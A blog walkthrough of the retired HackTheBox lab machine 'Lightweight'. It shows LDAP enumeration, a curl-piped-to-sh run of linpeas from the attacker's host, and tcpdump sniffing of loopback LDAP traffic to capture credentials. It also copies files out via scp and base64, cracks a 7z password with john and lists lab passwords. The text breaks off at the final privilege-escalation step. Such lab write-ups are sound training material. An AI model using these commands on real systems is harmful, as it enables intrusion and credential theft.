---
layout: post
title: "HTB-Lightweight"
categories: HTB-Walkthrough
---


![lightweight](/assets/img/lightweight/lightweight1.png)


Lightweight is a box from TJNull's 'more challenging than OSCP' list of retired HTB machines.


<h3>Nmap</h3>

```
nmap -sV -Pn -p- --min-rate 10000 10.10.10.119
```

```
Nmap scan report for lightweight.htb (10.10.10.119)
Host is up (0.11s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X

```

We can add `lightweight.htb` to our /etc/hosts file.

To learn more about the found services we can run nmap again with the 'default scripts' flag set (-sC)

```
nmap -sVC -Pn -p22,80,389 10.10.10.119
```
```
Nmap scan report for lightweight.htb (10.10.10.119)
Host is up (0.094s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time

```



Focusing on the 'ldap' service we can run the relevant 'nse scripts'

```
nmap lightweight.htb --script=ldap*



Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 07:59 EDT
Nmap scan report for lightweight.htb (10.10.10.119)
Host is up (0.095s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       namingContexts: dc=lightweight,dc=htb
|       supportedControl: 2.16.840.1.113730.3.4.18
|       supportedControl: 2.16.840.1.113730.3.4.2
|       supportedControl: 1.3.6.1.4.1.4203.1.10.1
|       supportedControl: 1.3.6.1.1.22
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.826.0.1.3344810.2.3
|       supportedControl: 1.3.6.1.1.13.2
|       supportedControl: 1.3.6.1.1.13.1
|       supportedControl: 1.3.6.1.1.12
|       supportedExtension: 1.3.6.1.4.1.1466.20037
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.1
|       supportedExtension: 1.3.6.1.4.1.4203.1.11.3
|       supportedExtension: 1.3.6.1.1.8
|       supportedLDAPVersion: 3
|_      subschemaSubentry: cn=Subschema
| ldap-search: 
|   Context: dc=lightweight,dc=htb
|     dn: dc=lightweight,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: lightweight htb
|         dc: lightweight
|     dn: cn=Manager,dc=lightweight,dc=htb
|         objectClass: organizationalRole
|         cn: Manager
|         description: Directory Manager
|     dn: ou=People,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: People
|     dn: ou=Group,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: Group
|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser1
|         cn: ldapuser1
|         sn: ldapuser1
|         mail: ldapuser1@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1000
|         gidNumber: 1000
|         homeDirectory: /home/ldapuser1
|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser2
|         cn: ldapuser2
|         sn: ldapuser2
|         mail: ldapuser2@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1001
|         gidNumber: 1001
|         homeDirectory: /home/ldapuser2
|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser1
|         userPassword: {crypt}x
|         gidNumber: 1000
|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser2
|         userPassword: {crypt}x
|_        gidNumber: 1001

Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
```




<hr width="300" size="10">


<h3>Web</h3>

The webpage has a nice looking image-slider:

![web1](/assets/img/lightweight/light-web1.png)


The 'info.php' page sets out the scenario (a penetration test) and gives us a light warning:

![info](/assets/img/lightweight/light-info.png)


`Status.php` gives us a list of banned IPs:

![status](/assets/img/lightweight/light-status.png)



The `user.php` page reflects our IP, and informs us how to login with it via the ssh service.

![user](/assets/img/lightweight/light-user.png)


It Works!

![ssh](/assets/img/lightweight/light-ssh1.png)



<hr width="300" size="10">

<h3>Enumeration</h3>

Checking out `/var/www/html` first:
```
[10.10.14.35@lightweight html]$ ls
banned.txt  css  index.php  info.php  js  reset.php  reset_req  status.php  user.php
[10.10.14.35@lightweight html]$ 
```

Checking out the `/etc/passwd` file to enumerate the users:

```
[10.10.14.35@lightweight html]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
libstoragemgmt:x:998:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
ldap:x:55:55:OpenLDAP server:/var/lib/ldap:/sbin/nologin
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
ldapuser1:x:1000:1000::/home/ldapuser1:/bin/bash
ldapuser2:x:1001:1001::/home/ldapuser2:/bin/bash
10.10.14.2:x:1002:1002::/home/10.10.14.2:/bin/bash
10.10.14.35:x:1003:1003::/home/10.10.14.35:/bin/bash
[10.10.14.35@lightweight html]$ 
```

Besides another HTB haxor in the machine (10.10.14.2), we find the two 'ldap' user accounts.


<hr width="300" size="10">

For quick and effective enumeration we can use the `linpeas.sh` script.
first check to make sure curl is installed.


<h3>linpeas.sh</h3>


```
[10.10.14.18@lightweight boo]$ which curl
/usr/bin/curl
```

Good, we can run linpeas with curl from the attacking box, so we don't need to transfer it to the target!


Start a python web server to host the file.
```
python3 -m http.server 80
```

I create the temp working folder `/var/tmp/boo`
```
mkdir /var/tmp/boo
```

from there I use curl to run the script.

  
```
[10.10.14.18@lightweight boo]$ curl http://10.10.14.35/linpeas.sh |sh |tee -a enum.txt
```

We can examine the output from stdout, or the created 'enum.txt' file, we can transfer this back to Kali
a number of ways.

Since we already have ssh access the quickest is probably via `scp`

(from Kali):
```
scp 10.10.14.35@10.10.10.119:/var/tmp/boo/enum.txt .
```

Another easy way would be to base64 encode the file, then copypaste the resultant encoding back on kali and decode it to file.

```
cat enum.txt |base64 -w0
```
Then on Kali:
```
echo <base64 encoding> |base64 -d > enum.txt
```

<hr width="300" size="10">



<h3>TcpDump</h3>

Ldap can use [simple authentication](https://ldapwiki.com/wiki/Simple%20Authentication) we can try to sniff
local traffic to the ldap port,

Check if the target has tcpdump installed:

```
[10.10.14.35@lightweight boo]$ which tcpdump
/usr/sbin/tcpdump
```

```
tcpdump -i lo -nnXs 0 'port 389' -vv |tee -a dump.pcap
```

Let it run for a while...To stimulate traffic, visit the 'status' page in the browser.


press ^c to stop the scan.
```
^C55 packets captured
110 packets received by filter
0 packets dropped by kernel
```
a good amount of packets captured.

Looking at the packets in stdout, we can see the creds caught in the traffic.


![tcpdump](/assets/img/lightweight/light-tcpdump-packet.png)

We can use `scp` again to get the dump file back to Kali.

```
scp 10.10.14.35@10.10.10.119:/var/tmp/boo/dump.pcap .
10.10.14.35@10.10.10.119's password: 

dump.pcap                                      100%   28KB 142.2KB/s   00:00
```


It looks like an md5 hash of the password, but because it is 'simple authentication' it is actually the plaintext password!


We can switch users to ldapuser2:

```
su ldapuser2

password: 8bc8251332abe1d7f105d3e53ad39ac2
```


we got ldapuser2 shell...

```
[ldapuser2@lightweight boo]$ id
uid=1001(ldapuser2) gid=1001(ldapuser2) groups=1001(ldapuser2) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```


<hr width="300" size="10">



<h3>Privilege Escalation</h3>


check out ldapuser2's home directory:

```
[ldapuser2@lightweight boo]$ cd
[ldapuser2@lightweight ~]$ ls
backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
```

Grab the user flag.


```
[ldapuser2@lightweight ~]$ cat user.txt
8a8xxxxxxxxxxxxxxxxxxxxxxxxxx026
```


We can copy over the backup.7z file, again with `scp` (with the new creds) or with the base64 encoding method.

```
cat backup.7z |base64 -w0

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
```

Then on Kali:
```
echo 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 |base64 -d > backup.7z
```


We need a password to unzip the file, 7ztojohn.pl can make the file's hash palatable for john.


```
/usr/share/john/7z2john.pl backup.7z > hash.txt
```


now we can use john to crack the password

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

the password = `delete`



<hr width="300" size="10">


We can now unzip the file:


`7z x backup.7z`


```
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-5600U CPU @ 2.60GHz (306D4),ASM,AES-NI)

Scanning the drive for archives:
1 file, 3411 bytes (4 KiB)

Extracting archive: backup.7z
--
Path = backup.7z
Type = 7z
Physical Size = 3411
Headers Size = 259
Method = LZMA2:12k 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
Everything is Ok

Files: 5
Size:       10270
Compressed: 3411
```

It seems to be a backup of the /var/www/html folder.


status.php contains credentials for ldapuser1

```
<?php
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
$ldapconfig['host'] = 'lightweight.htb';
$ldapconfig['port'] = '389';
$ldapconfig['basedn'] = 'dc=lightweight,dc=htb';
//$ldapconfig['usersdn'] = 'cn=users';
```



`ldapuser1 / f3ca9d298a553da117442deeb6fa932d`


<hr width="300" size="10">


<h3>Privesc - ldapuser1 to root</h3>


```
[ldapuser2@lightweight ~]$ su ldapuser1
Password: 

[ldapuser1@lightweight ldapuser2]$ cd
